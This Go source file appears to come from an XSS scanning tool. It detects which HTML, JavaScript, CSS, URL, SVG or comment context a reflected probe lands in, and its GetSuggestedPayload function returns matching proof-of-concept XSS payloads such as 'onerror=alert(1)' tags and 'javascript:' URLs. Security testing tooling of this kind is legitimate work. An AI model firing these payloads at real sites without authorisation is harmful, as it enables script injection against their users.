package scanner

import (
	"regexp"
	"strings"

	"github.com/lcalzada-xor/xxss/models"
)

// DetectContext analyzes the HTML around the probe to determine reflection context
func DetectContext(body, probe string) models.ReflectionContext {
	// Find first occurrence of probe
	index := strings.Index(body, probe)
	if index == -1 {
		return models.ContextUnknown
	}

	// Get surrounding context (500 chars before and after)
	start := max(0, index-500)
	end := min(len(body), index+len(probe)+500)
	context := body[start:end]

	// Check contexts in order of specificity
	if isInComment(context, probe) {
		return models.ContextComment
	}

	if isInMetaRefresh(context, probe) {
		return models.ContextMetaRefresh
	}

	if isInDataURI(context, probe) {
		return models.ContextDataURI
	}

	if isInSVG(context, probe) {
		return models.ContextSVG
	}

	if isInTemplateLiteral(context, probe) {
		return models.ContextTemplateLiteral
	}

	if isInJavaScript(context, probe) {
		return models.ContextJavaScript
	}

	if isInCSS(context, probe) {
		return models.ContextCSS
	}

	if isInURL(context, probe) {
		return models.ContextURL
	}

	if isInAttribute(context, probe) {
		return models.ContextAttribute
	}

	// Default to HTML
	return models.ContextHTML
}

func isInJavaScript(context, probe string) bool {
	// Check if inside <script> tags
	scriptPattern := regexp.MustCompile(`(?i)<script[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</script>`)
	if scriptPattern.MatchString(context) {
		return true
	}

	// Check for inline event handlers (onclick, onload, etc.)
	// Need to verify probe is INSIDE the event handler value, not after it
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false
	}

	before := context[:probeIndex]

	// Look for event handler pattern before probe
	eventPattern := regexp.MustCompile(`(?i)on\w+\s*=\s*["']?[^"'>]*$`)
	if !eventPattern.MatchString(before) {
		return false
	}

	// Find last < and > to ensure we're in a tag
	lastTagStart := strings.LastIndex(before, "<")
	lastTagEnd := strings.LastIndex(before, ">")

	if lastTagEnd > lastTagStart {
		return false // Not inside a tag
	}

	// Count quotes to see if we're inside the event handler value
	afterEvent := before[lastTagStart:]
	doubleQuotes := strings.Count(afterEvent, "\"")
	singleQuotes := strings.Count(afterEvent, "'")

	// Odd number of quotes means we're inside
	return (doubleQuotes%2 == 1) || (singleQuotes%2 == 1)
}

func isInCSS(context, probe string) bool {
	// Check if inside <style> tags
	stylePattern := regexp.MustCompile(`(?i)<style[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</style>`)
	if stylePattern.MatchString(context) {
		return true
	}

	// Check for inline style attribute - verify probe is INSIDE the style value
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false
	}

	before := context[:probeIndex]

	// Look for style= pattern before probe
	styleAttrPattern := regexp.MustCompile(`(?i)style\s*=\s*["']?[^"'>]*$`)
	if !styleAttrPattern.MatchString(before) {
		return false
	}

	// Find last < and > to ensure we're in a tag
	lastTagStart := strings.LastIndex(before, "<")
	lastTagEnd := strings.LastIndex(before, ">")

	if lastTagEnd > lastTagStart {
		return false // Not inside a tag
	}

	// Count quotes to see if we're inside the style value
	afterStyle := before[lastTagStart:]
	doubleQuotes := strings.Count(afterStyle, "\"")
	singleQuotes := strings.Count(afterStyle, "'")

	return (doubleQuotes%2 == 1) || (singleQuotes%2 == 1)
}

func isInAttribute(context, probe string) bool {
	// Check if inside HTML tag attribute value
	// We need to be more precise: the probe must be INSIDE the attribute value
	// Pattern: <tag attr="...probe..." or <tag attr='...probe...'
	// NOT just: <tag attr="value"> probe (which would be HTML context)

	// Find the probe position
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false
	}

	// Look backwards from probe to find if we're inside quotes within a tag
	before := context[:probeIndex]

	// Find the last < before the probe
	lastTagStart := strings.LastIndex(before, "<")
	// Find the last > before the probe
	lastTagEnd := strings.LastIndex(before, ">")

	// If the last > is after the last <, we're NOT inside a tag
	if lastTagEnd > lastTagStart {
		return false
	}

	// We're potentially inside a tag, now check if we're inside an attribute value
	// Count quotes after the last <
	afterTagStart := before[lastTagStart:]
	doubleQuotes := strings.Count(afterTagStart, "\"")
	singleQuotes := strings.Count(afterTagStart, "'")

	// If odd number of quotes, we're inside an attribute value
	return (doubleQuotes%2 == 1) || (singleQuotes%2 == 1)
}

func isInURL(context, probe string) bool {
	// Check if inside href, src, action, data attributes
	// Need to verify probe is INSIDE the URL value
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false
	}

	before := context[:probeIndex]

	// Look for URL attribute pattern before probe
	urlAttrPattern := regexp.MustCompile(`(?i)(href|src|action|data|formaction)\s*=\s*["']?[^"'>]*$`)
	if !urlAttrPattern.MatchString(before) {
		return false
	}

	// Find last < and > to ensure we're in a tag
	lastTagStart := strings.LastIndex(before, "<")
	lastTagEnd := strings.LastIndex(before, ">")

	if lastTagEnd > lastTagStart {
		return false // Not inside a tag
	}

	// Count quotes to see if we're inside the URL value
	afterAttr := before[lastTagStart:]
	doubleQuotes := strings.Count(afterAttr, "\"")
	singleQuotes := strings.Count(afterAttr, "'")

	return (doubleQuotes%2 == 1) || (singleQuotes%2 == 1)
}

func isInComment(context, probe string) bool {
	// Check if inside HTML comment
	commentPattern := regexp.MustCompile(`<!--[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?-->`)
	return commentPattern.MatchString(context)
}

// isInTemplateLiteral checks if probe is inside JavaScript template literal
func isInTemplateLiteral(context, probe string) bool {
	// Check for template literal syntax: `...${probe}...`
	templateLiteralPattern := regexp.MustCompile("`[^`]*\\$\\{[^}]*" + regexp.QuoteMeta(probe) + "[^}]*\\}[^`]*`")
	if templateLiteralPattern.MatchString(context) {
		return true
	}
	// Also check for simple backtick strings
	backtickPattern := regexp.MustCompile("`[^`]*" + regexp.QuoteMeta(probe) + "[^`]*`")
	return backtickPattern.MatchString(context)
}

// isInSVG checks if probe is inside SVG context
func isInSVG(context, probe string) bool {
	// Check if inside <svg> tags
	svgPattern := regexp.MustCompile(`(?i)<svg[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</svg>`)
	if svgPattern.MatchString(context) {
		return true
	}
	// Check for SVG-specific tags
	svgTagsPattern := regexp.MustCompile(`(?i)<(animate|animateTransform|set|animateMotion|path|circle|rect|line|ellipse|polygon|polyline|text|tspan|image)[^>]*` + regexp.QuoteMeta(probe))
	return svgTagsPattern.MatchString(context)
}

// isInMetaRefresh checks if probe is inside meta refresh tag
func isInMetaRefresh(context, probe string) bool {
	// Check for meta refresh with URL
	metaRefreshPattern := regexp.MustCompile(`(?i)<meta[^>]*http-equiv=["']?refresh["']?[^>]*content=["'][^"']*` + regexp.QuoteMeta(probe))
	return metaRefreshPattern.MatchString(context)
}

// isInDataURI checks if probe is inside a data URI
func isInDataURI(context, probe string) bool {
	// Check for data: URI scheme
	dataURIPattern := regexp.MustCompile(`(?i)(href|src|action|data|formaction)\s*=\s*["']?data:[^"'\s>]*` + regexp.QuoteMeta(probe))
	return dataURIPattern.MatchString(context)
}

// GetSuggestedPayload returns a context-specific XSS payload
func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) string {
	// Check which characters are available
	hasLt := contains(unfiltered, "<")
	hasGt := contains(unfiltered, ">")
	hasDquote := contains(unfiltered, "\"")
	hasSquote := contains(unfiltered, "'")
	hasQuote := hasDquote || hasSquote
	hasSpace := contains(unfiltered, " ")
	hasEquals := contains(unfiltered, "=")
	hasSlash := contains(unfiltered, "/")
	hasParen := contains(unfiltered, "(") && contains(unfiltered, ")")

	switch context {
	case models.ContextHTML:
		if hasLt && hasGt {
			if hasSpace && hasEquals {
				// XSS without quotes
				return "<img src=x onerror=alert(1)>"
			}
			if hasSlash {
				return "<script>alert(1)</script>"
			}
			return "<svg onload=alert(1)>"
		}

	case models.ContextJavaScript:
		if hasSquote {
			return "';alert(1);//"
		}
		if hasDquote {
			return "\";alert(1);//"
		}
		if hasParen {
			return ";alert(1);//"
		}

	case models.ContextAttribute:
		// Priority 1: If we have < and >, break out of tag completely
		if hasGt && hasLt {
			return "><script>alert(1)</script>"
		}
		// Priority 2: If we have quotes and space, use event handler
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onload=" + quote + "alert(1)"
		}

	case models.ContextCSS:
		if hasParen {
			return "expression(alert(1))"
		}
		return "x:expression(alert(1))"

	case models.ContextURL:
		return "javascript:alert(1)"

	case models.ContextTemplateLiteral:
		// Break out of template literal
		if contains(unfiltered, "$") && contains(unfiltered, "{") && contains(unfiltered, "}") {
			return "${alert(1)}"
		}
		if contains(unfiltered, "`") {
			return "`+alert(1)+`"
		}
		return "';alert(1);//"

	case models.ContextSVG:
		// SVG-specific XSS
		if hasLt && hasGt {
			return "<set attributeName=onmouseover value=alert(1)>"
		}
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onload=" + quote + "alert(1)"
		}
		return "<animate onbegin=alert(1)>"

	case models.ContextMetaRefresh:
		// Meta refresh URL injection
		return "javascript:alert(1)"

	case models.ContextDataURI:
		// Data URI XSS
		return "data:text/html,<script>alert(1)</script>"

	case models.ContextComment:
		if hasGt && hasLt {
			return "--><script>alert(1)</script><!--"
		}
	}

	return ""
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
